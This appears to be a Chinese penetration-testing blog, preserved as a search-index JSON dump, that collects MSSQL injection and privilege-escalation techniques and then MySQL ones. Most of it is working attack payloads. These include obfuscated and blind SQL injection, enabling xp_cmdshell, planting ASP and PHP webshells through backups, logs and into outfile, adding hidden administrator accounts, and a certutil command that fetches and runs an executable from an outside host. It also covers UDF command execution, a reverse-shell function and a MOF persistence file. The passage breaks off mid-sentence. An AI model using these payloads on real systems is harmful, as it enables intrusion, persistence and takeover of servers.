select*fromadminwhereid=1;declare@svarchar(2000)set@s=CHAR(115)+CHAR(101)+CHAR(108)+CHAR(101)+CHAR(99)+CHAR(116)+CHAR(32)+CHAR(99)+CHAR(111)+CHAR(110)+CHAR(118)+CHAR(101)+CHAR(114)+CHAR(116)+CHAR(40)+CHAR(105)+CHAR(110)+CHAR(116)+CHAR(44)+CHAR(64)+CHAR(64)+CHAR(118)+CHAR(101)+CHAR(114)+CHAR(115)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(41)exec(@s)-- ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:4:1","tags":["渗透测试","提权"],"title":"MSSQL 注入与提权方法整理","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"4.2 盲注 其实跟 mysql 大同小异无非就是分割字符串比较，但是 mssql 的盲注套路确实没那么多。 4.2.1 布尔盲注 id=1andascii(substring((selecttop1namefrommaster.dbo.sysdatabases),1,1))\u003e=109 4.2.2 时间盲注 id=1;if(selectIS_SRVROLEMEMBER('sysadmin'))=1WAITFORDELAY'0:0:5'-- id=1;if(ascii(substring((selecttop1namefrommaster.dbo.sysdatabases),1,1)))\u003e1WAITFORDELAY'0:0:5'-- ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:4:2","tags":["渗透测试","提权"],"title":"MSSQL 注入与提权方法整理","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"4.2 联合注入 mssql 联合注入我们一般不使用数字占位，而是 null，因为使用数字占位可能会发生隐式转换 id=1 union select null,name,pass from info 也可以利用如下方法： id=1 SELECT 1 UNION (select CAST(USER as int)) ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:4:3","tags":["渗透测试","提权"],"title":"MSSQL 注入与提权方法整理","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"5 MSSQL 提权 ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:5:0","tags":["渗透测试","提权"],"title":"MSSQL 注入与提权方法整理","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"5.1 备份拿 shell 备份拿 shell 也就涉及到了权限的问题，SA 权限不用说没有降权的话基本能做任何事情了，它数据库权限是 db_owner，当然其他用户如果也拥有 db_owner 基本也可以通过备份拿下 shell，但是在设置目录权限后就不行了。 5.1.1 路径的寻找 需要路径的我们一般有几个思路： 报错寻找 字典 旁站信息收集 调用储存过程来搜索 读配置文件 这里我们着重讨论一下储存过程也就是这些函数来找我们的网站根目录。一般我们可以用 xp_cmdshell、xp_dirtree、xp_dirtree、xp_subdirs executemaster..xp_dirtree'c:'//列出所有c:\\文件和目录,子目录executemaster..xp_dirtree'c:',1//只列c:\\文件夹executemaster..xp_dirtree'c:',1,1//列c:\\文件夹加文件 通过执行 xp_dirtree 返回我们传入的参数，如果没有回显的话，可以这样创建一个临时的表插入 id=1;CREATETABLEtmp(dirvarchar(8000),numint,num1int);id=1;insertintotmp(dir,num,num1)executemaster..xp_dirtree'c:',1,1 xp_cmdshell 寻找路径： 这个 xp_cmdshell 找起来更加方便我们调用cmd的命令去搜索，比如我的web目录有个1.aspx C:\\Users\\Gee\u003efor /r c:\\ %i in (1*.aspx) do @echo %i c:\\www\\1.aspx 所以只需要建立一个表，存在一个 char 字段就可以了。 id=1;CREATETABLEcmdtmp(dirvarchar(8000));id=1;insertintocmdtmp(dir)execmaster..xp_cmdshell'for /r c:\\ %i in (1*.aspx) do @echo %i' 信息 SQL Server 阻止了对组件 xp_cmdshell 的过程 sys.xp_cmdshell 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用。 如果遇到 xp_cmdshell 不能调用，报错，可用如下命令恢复： // 允许修改高级参数 ;EXEC sp_configure 'show advanced options',1;RECONFIGURE; // 打开xp_cmdshell 扩展 ;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;-- 5.1.2 差异备份 //完整备份一次(保存位置可以改)backupdatabase库名todisk='c:\\bak.bak';-- createtable[dbo].[test]([cmd][image]);//创建表cmd并插入一句话木马insertintotest(cmd)values(0x3C25657865637574652872657175657374282261222929253E)//进行差异备份backupdatabase库名todisk='C:\\d.asp'WITHDIFFERENTIAL,FORMAT;-- 差异备份有多种情况可能不成功，一般就是目录权限的问题，第一次备份的目录是否可能没有权限，第二次备份到网站目录是否有权限，所以一般不要直接备份到 c 盘根目录 当过滤了特殊的字符比如单引号，或者路径符号都可以使用前面提到的定义局部变量来执行。 5.1.3 LOG 备份 LOG 备份需要先把指定的数据库激活为还原模式，所以需要执行alter database XXX set RECOVERY FUL，而差异备份不需要，所以只有这条语句的就是 LOG 备份 LOG 备份的要求是目标机器的数据库备份过，而且选择恢复模式得是完整模式，但是使用 log 备份文件会小的多，当然如果你的权限够高可以设置他的恢复模式。 alterdatabase库名setRECOVERYFULLcreatetablecmd(aimage)backuplog库名todisk='c:\\xxx'withinitinsertintocmd(a)values(0x3C25657865637574652872657175657374282261222929253E)backuplog库名todisk='c:\\xxx\\2.asp' 相对于差异备份，log 备份的好处就是备份出来的 webshell 的文件大小非常的小。 ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:5:1","tags":["渗透测试","提权"],"title":"MSSQL 注入与提权方法整理","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"5.2 xp_cmdshell 测试 xp_cmdshell 是否可以执行 exec master..xp_cmdshell 'ver' 添加管理员用户 exec master.dbo.xp_cmdshell 'net user q 123456q /add' exec master.dbo.xp_cmdshell 'net localgroup administrators q /add' 远程下载文件，上马 execmaster.dbo.xp_cmdshell'cd c:\\www \u0026 certutil -urlcache -split -f http://192.168.130.142:80/download/file.exe';execmaster.dbo.xp_cmdshell'cd c:\\www \u0026 file.exe'; ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:5:2","tags":["渗透测试","提权"],"title":"MSSQL 注入与提权方法整理","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"5.3 sp_oacreate 当 xp_cmdshell 被删除可以使用这个来提权试试，恢复 sp_oacreate EXECsp_configure'show advanced options',1;RECONFIGUREWITHOVERRIDE;EXECsp_configure'Ole Automation Procedures',1;RECONFIGUREWITHOVERRIDE;EXECsp_configure'show advanced options',0; sp_oacreate 是一个非常危险的存储过程可以删除、复制、移动文件。还能配合 sp_oamethod 来写文件执行 cmd。 有以下几种利用思路： 调用 cmd 来执行命令 wscript.shell执行命令declare@shellintexecsp_oacreate'wscript.shell',@shelloutputexecsp_oamethod@shell,'run',null,'c:\\windows\\system32\\cmd.exe /c xxx'Shell.Application执行命令declare@ointexecsp_oacreate'Shell.Application',@ooutexecsp_oamethod@o,'ShellExecute',null,'cmd.exe','cmd /c net user \u003ec:\\test.txt','c:\\windows\\system32','','1'; 写入启动项 declare@sp_passwordxieoint,@fint,@tint,@retintexecsp_oacreate'scripting.filesystemobject',@sp_passwordxieooutexecsp_oamethod@sp_passwordxieo,'createtextfile',@fout,'d:\\RECYCLER\\1.vbs',1exec@ret=sp_oamethod@f,'writeline',NULL,'set wsnetwork=CreateObject(\"WSCRIPT.NETWORK\")'exec@ret=sp_oamethod@f,'writeline',NULL,'os=\"WinNT://\"\u0026wsnetwork.ComputerName'exec@ret=sp_oamethod@f,'writeline',NULL,'Set ob=GetObject(os)'exec@ret=sp_oamethod@f,'writeline',NULL,'Set oe=GetObject(os\u0026\"/Administrators,group\")'exec@ret=sp_oamethod@f,'writeline',NULL,'Set od=ob.Create(\"user\",\"123$\")'exec@ret=sp_oamethod@f,'writeline',NULL,'od.SetPassword \"123\"'exec@ret=sp_oamethod@f,'writeline',NULL,'od.SetInfo'exec@ret=sp_oamethod@f,'writeline',NULL,'Set of=GetObject(os\u0026\"/123$\",user)'exec@ret=sp_oamethod@f,'writeline',NULL,'oe.add os\u0026\"/123$\"'; ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:5:3","tags":["渗透测试","提权"],"title":"MSSQL 注入与提权方法整理","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"5.4 沙盒提权 沙盒模式是数据库的一种安全功能。在沙盒模式下，只对控件和字段属性中的安全且不含恶意代码的表达式求值。如果表达式不使用可能以某种方式损坏数据的函数或属性，则可认为它是安全的。 使用场景：无法执行命令时，xp_regwrite 可用(使用条件) 开启沙盒模式： exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Jet\\4.0\\Engines','SandBoxMode','REG_DWORD',1 SandBoxMode参数含义（默认是2） 0：在任何所有者中禁止启用安全模式 1 ：为仅在允许范围内 2 ：必须在access模式下 3：完全开启 利用 jet.oledb 执行系统命令添加用户 select * from openrowset('microsoft.jet.oledb.4.0' ,';database=c:\\windows\\system32\\ias\\ias.mdb' ,'select shell(\"cmd.exe /c net user q 123456q /add\")') 将 q 用户添加至管理员组 select * from openrowset('microsoft.jet.oledb.4.0' ,';database=c:\\windows\\system32\\ias\\ias.mdb' ,'select shell(\"cmd.exe /c net localgroup administrators q /add\")') ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:5:4","tags":["渗透测试","提权"],"title":"MSSQL 注入与提权方法整理","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"5.5 利用 mssql 模拟登录提权 开发者有时为了满足某种需求，允许其他登录用户模拟高权限的用户，对于开发来说，一个再简单不过的功能。虽然严格意义上这不算个漏洞，但是这种配置不当一般可以用来提权。 5.5.1 赋予用户 MyUser1 权限来模拟 MyUser2, MyUser3,及sa USE master; GRANT IMPERSONATE ON LOGIN::sa to [MyUser1]; GRANT IMPERSONATE ON LOGIN::MyUser2 to [MyUser1]; GRANT IMPERSONATE ON LOGIN::MyUser3 to [MyUser1]; GO 5.5.2 查找可以模拟登录的用户 默认情况下，系统管理员可以模拟任何人，但是正常登录必须分配权限来模拟特定的用户，使用 MyUser1 用户登录，打开新建查询，执行下面语句查询那些用户可以用来模拟登录 SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' 这里我们可以看到 MyUser1 用户可以模拟登录 sa, MyUser2, MyUser2 用户，接下来就是模拟登录 sa 来获取 sysadmin 权限了 5.5.3 模拟 SQL Server 用户登陆 -- 验证是否为sysadmin权限 SELECTSYSTEM_USERSELECTIS_SRVROLEMEMBER('sysadmin')-- 模拟sa登录 EXECUTEASLOGIN='sa'-- 验证是否为sysadmin权限 SELECTSYSTEM_USERSELECTIS_SRVROLEMEMBER('sysadmin') 5.3.4 PS 工具化 当然这个也可以用 powershell 一键实现：脚本地址 ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:5:5","tags":["渗透测试","提权"],"title":"MSSQL 注入与提权方法整理","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"6 CLR 提权 通过回顾常见的手法，可以看出，在目标系统该做安全防护都做了的情况下，除了备份拿 shell 之外，其它的操作均需要 sysadmin 服务器角色。 对于部分常见手法的防护，网上提出了一些极端的修复方法，比如将存储过程和其相关的 DLL 文件删除，其它功能可能删除，但是删除 CLR 可能性应该不大，且不论禁用或者删除 .net 之后 SQL Server 还能不能正常运行，SQL CLR 功能强大，开发也可能使用它开发正常功能，删除无异于自废武功。 ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:6:0","tags":["渗透测试","提权"],"title":"MSSQL 注入与提权方法整理","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"6.1 SQL Server CLR 介绍 公共语言运行库(Common Language Runtime，CLR)是整个 .NET 框架的核心，它为 .NET 应用程序提供了一个托管的代码执行环境。它实际上是驻留在内存里的一段代理代码， 负责应用程序在整个执行期间的代码管理工作，比较典型的有：内存管理、线程管理、安全管理、远程管理、即使编译、代码强制安全类检查等，这些都可以成为 .NET 框架的生命线。 通俗来讲 CLR 就是 .NET 程序运行的基础。 SQL Server 中的 CLR SQL CLR 是 SQL Server2005 出现的新功能，它将 .NET Framework 中的 CLR 服务注入到 SQL Server 中，让 SQL Server 的部分数据库对象可以使用 .NET Framework 的编程语言进行开发(目前只支持VB.NET和C#)，包括存储过程、用户自定义函数、触发器、 用户自定义类型以及用户自定义聚合函数等功能。 SQL Server 的 CLR 让我们可以用 C# 或者 VB 开发存储过程、用户自定义函数、触发器、用户自定义类型以及用户自定义聚合函数。但是我们最容易利用的是存储过程和触发器。触发器有 DDL 触发器和 DML 触发器两种，DDL 触发器对应的语句语句主要以 CREATE、ALTER 和 DROP 开头，DML 触发器对应的语句主要是 INSERT、UPDATE 或 DELETE，相比而言 DML 触发器更可控。 参考： https://xz.aliyun.com/t/8195 https://github.com/aleenzz/MSSQL_SQL_BYPASS_WIKI SQL Server的CLR在渗透测试中的应用 ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:6:1","tags":["渗透测试","提权"],"title":"MSSQL 注入与提权方法整理","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"MySQL 提权方法整理","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/","tags":["渗透测试","提权"],"title":"MySQL 提权方法整理","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"MySQL 提权方法整理 ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:0:0","tags":["渗透测试","提权"],"title":"MySQL 提权方法整理","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"1 Initial Access ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:1:0","tags":["渗透测试","提权"],"title":"MySQL 提权方法整理","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"1.1 数据库权限 拿到数据库操作权限的方法无外乎有以下几种： 3306 弱口令爆破 sqlmap 的 –sql-shell 模式 网站的数据库配置文件中拿到明文密码信息 mysql 1day 漏洞获取权限 ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:1:1","tags":["渗透测试","提权"],"title":"MySQL 提权方法整理","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"1.2 webshell 权限 前提 已知网站物理路径且该路径有写权限 高权限数据库用户 secure_file_priv 无限制 mysql\u003eshowglobalvariableslike'%secure_file_priv%';+------------------+-------+|Variable_name|Value|+------------------+-------+|secure_file_priv||+------------------+-------+ 在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件 在 MySQL 5.5之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件 具体原理在「SQL 注入相关」文章中已有详述，不在此赘述。 1.2.1 into outfile 写文件 select'\u003c?php phpinfo(); ?\u003e'intooutfile'/var/www/html/info.php'; sqlmap 下可以执行如下操作： sqlmap -u \"http://x.x.x.x/?id=x\" --file-write=\"/path/to/shell.php\" --file-dest=\"/var/www/html/test/shell.php\" 一般情况下 Linux 系统下面权限分配比较严格，MySQL 用户一般情况下是无法直接往站点根目录写入文件的，这种情况下在 Windows 环境下成功率会很高。 1.2.2 terminated by 写文件 ?id=1limit1intooutfile'C:/wamp64/www/work/webshell.php'linesterminatedby'\u003c?php phpinfo() ?\u003e'; 1.2.3 general log 写文件 MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell 信息 general_log 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中。 mysql\u003eSHOWVARIABLESLIKE'general%';+------------------+---------------------------------+|Variable_name|Value|+------------------+---------------------------------+|general_log|OFF||general_log_file|/var/lib/mysql/c1595d3a029a.log|+------------------+---------------------------------+ 通过将 general_log 存储位置改为 web 目录。同时，向日志文件里面写入内容的话，那么就可以成功 getshell。 # 更改日志文件位置 setglobalgeneral_log=\"ON\";setglobalgeneral_log_file='/var/www/html/info.php';# 查看当前配置 mysql\u003eSHOWVARIABLESLIKE'general%';+------------------+-----------------------------+|Variable_name|Value|+------------------+-----------------------------+|general_log|ON||general_log_file|/var/www/html/shell.php|+------------------+-----------------------------+# 往日志里面写入 payload select'\u003c?php phpinfo();?\u003e'; 警告 文件虽然可以写入，但是该文件的权限是 MySQL 创建的 ： -rw-rw---- 1 mysql mysql 293 Feb 19 10:29 shell.php 访问这个 php 文件会出现 HTTP 500 的状态码，结论是 Linux 系统这种情况基本上不会成功，只有在 Windows 系统下成功率会高一些。 ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:1:2","tags":["渗透测试","提权"],"title":"MySQL 提权方法整理","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"1.3 Hash 破解 假设存在 SQL 注入 DBA 权限，如果目标 3306 端口也是可以访问通的话，可以尝试读取 MySQL 的 Hash 来解密： #MySQL\u003c=5.6版本mysql\u003eselecthost,user,passwordfrommysql.user;#MySQL\u003e=5.7版本mysql\u003eselecthost,user,authentication_stringfrommysql.user; 之后可以通过在线界面网站解密。 ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:1:3","tags":["渗透测试","提权"],"title":"MySQL 提权方法整理","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"1.4 MySQL 1Day 漏洞 1.4.1 yaSSL 缓冲区溢出 MSF 里面已经集成好了对应的模块： msf6 \u003e use exploit/windows/mysql/mysql_yassl_hello msf6 \u003e use exploit/linux/mysql/mysql_yassl_hello 1.4.2 CVE-2012-2122 知道用户名多次输入错误的密码会有几率可以直接成功登陆进数据库，可以循环 1000 次登陆数据库： for i in `seq 1 1000`; do mysql -uroot -pwrong -h 127.0.0.1 -P3306 ; done 在 MSF 中有对应的利用模块： msf6 \u003e use auxiliary/scanner/mysql/mysql_authbypass_hashdump ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:1:4","tags":["渗透测试","提权"],"title":"MySQL 提权方法整理","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"2 UDF 提权 User Defined Function - 自定义函数，是数据库功能的一种扩展。用户通过自定义函数可以实现在 MySQL 中无法方便实现的功能，其添加的新函数都可以在 SQL 语句中调用，就像调用本机函数 version() 等方便。 ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:2:0","tags":["渗透测试","提权"],"title":"MySQL 提权方法整理","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"2.1 手动实现 2.1.1 动态链接库 如果是 MySQL \u003e= 5.1 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib\\plugin 文件夹下文件夹下才能创建自定义函数。 sqlmap 中的动态链接文件： /path/to/sqlmap/data/udf/mysql sqlmap 中 自带这些动态链接库为了防止被误杀都经过编码处理过，不能被直接使用。不过可以利用 sqlmap 自带的解码工具cloak.py 来解码使用，具体使用方法参考「SQL 注入相关」文章。 msf 中的动态链接库文件： /path/to/msf/embedded/framework/data/exploits/mysql 2.1.2 插件目录存放位置 通过如下 SQL 语句来实现： mysql\u003eshowvariableslike'%plugin%';+---------------+------------------------------+ |Variable_name|Value|+---------------+------------------------------+ |plugin_dir|/usr/local/mysql/lib/plugin/|+---------------+------------------------------+ 技巧 在 windows 下可以利用 NTFS 流来创建该文件夹： select 233 into dumpfile 'C:\\\\PhpStudy\\\\PHPTutorial\\\\MySQL\\\\lib\\\\plugin::$index_allocation'; 技巧 如何找到 mysql 的安装目录： mysql\u003eselect@@basedir;+------------------+ |@@basedir|+------------------+ |/usr/local/mysql|+------------------+ 2.1.3 写入动态链接库 SQL 注入且是高权限，plugin 目录可写且需要 secure_file_priv 无限制，MySQL 插件目录可以被 MySQL 用户写入，这个时候就可以直接使用 sqlmap 来上传动态链接库，又因为 GET 有字节长度限制，所以往往 POST 注入才可以执行这种攻击。 sqlmap -u \"http://localhost/\" --data=\"id=1\" --file-write=\"/path/to/lib_mysqludf_sys_64.so\" --file-dest=\"/usr/lib/mysql/plugin/udf.so\" 如果没有注入的话，我们可以操作原生 SQL 语句，这种情况下当 secure_file_priv 无限制的时候，可以通过手工写文件到 plugin 目录下的： #直接SELECT查询十六进制写入SELECT0x7f454c4602...INTODUMPFILE'/usr/lib/mysql/plugin/udf.so'; 这里的十六进制怎么获取呢？可以利用 MySQL 自带的 hex 函数来编码： #直接传入路径编码SELECThex(load_file('/lib_mysqludf_sys_64.so'));#也可以将路径hex编码SELECThex(load_file(0x2f6c69625f6d7973716c7564665f7379735f36342e736f)); 2.1.4 命令执行 CREATEFUNCTIONsys_evalRETURNSSTRINGSONAME'udf.dll';selectsys_eval('whoami'); 2.1.5 清理痕迹 删除自定义函数： dropfunctionsys_eval; ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:2:1","tags":["渗透测试","提权"],"title":"MySQL 提权方法整理","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"2.2 自动化实现 msf 中的模块： msf6 \u003e set payload linux/x86/shell/bind_tcp ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:2:2","tags":["渗透测试","提权"],"title":"MySQL 提权方法整理","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"2.3 UDF Shell 假设目标 MySQL 在内网情况下，无法直连 MySQL 或者 MySQL 不允许外连，这个时候一些网页脚本就比较方便好用了。 2.3.1 UDF.PHP UDF 命令执行大马：https://github.com/echohun/tools/blob/master/大马/udf.php 2.3.2 Navicat MySQL 目标 MySQL 不允许外连，这个时候可以使用 Navicat 自带的 tunnel 隧道脚本上传到目标网站上： 接着连接的时候设置 HTTP 通道： 连接成功后就可以进行上述手工 UDF 提权步骤。 ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:2:3","tags":["渗透测试","提权"],"title":"MySQL 提权方法整理","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"2.4 反弹端口提权 实际上这是 UDF 提权的另一种用法，只是这里的动态链接库被定制过的，功能更多更实用一些： cmdshell # 执行cmd downloader # 下载者,到网上下载指定文件并保存到指定目录 open3389 # 通用开3389终端服务,可指定端口(不改端口无需重启) backshell # 反弹Shell ProcessView # 枚举系统进程 KillProcess # 终止指定进程 regread # 读注册表 regwrite # 写注册表 shut # 关机,注销,重启 about # 说明与帮助函数 地址：https://github.com/Geekby/langouster_udf 首先在攻击机上开启 NC 监听，然后目标机器上导入 dll 动态链接库，然后创建自定义函数： CREATEFUNCTIONbackshellRETURNSSTRINGSONAME'udf.dll'; 直接反弹 shell ： selectbackshell(\"IP\",4444); ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:2:4","tags":["渗透测试","提权"],"title":"MySQL 提权方法整理","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"3 MOF 提权 MOF 提权是一个有历史的漏洞，基本上在 Windows Server 2003 的环境下才可以成功。 ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:3:0","tags":["渗透测试","提权"],"title":"MySQL 提权方法整理","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"3.1 原理 提权的原理是 C:/Windows/system32/wbem/mof/ 目录下的 mof 文件每隔一段时间（几秒钟左右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 来执行系统命令，如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了。 ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:3:1","tags":["渗透测试","提权"],"title":"MySQL 提权方法整理","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"3.2 手动复现 3.2.1 上传 mof 文件 #pragma namespace(\"\\\\\\\\.\\\\root\\\\subscription\") instance of __EventFilter as $EventFilter { EventNamespace = \"Root\\\\Cimv2\"; Name = \"filtP2\"; Query = \"Select * From __InstanceModificationEvent \" \"Where TargetInstance Isa \\\"Win32_LocalTime\\\" \" \"And TargetInstance.Second = 5\"; QueryLanguage = \"WQL\"; }; instance of ActiveScriptEventConsumer as $Consumer { Name = \"consPCSV2\"; ScriptingEngine = \"JScript\"; ScriptText = \"var WSH = new ActiveXObject(\\\"WScript.Shell\\\")\\nWSH.run(\\\"net.exe user hacker P@ssw0rd /add\\\")\\nWSH.run(\\\"net.exe localgroup administrators hacker /add\\\")\"; }; instance of __FilterToConsumerBinding { Consumer = $Consumer; Filter = $EventFilter; }; 利用 MySQL 写文件的特性将这个 MOF 文件导入到 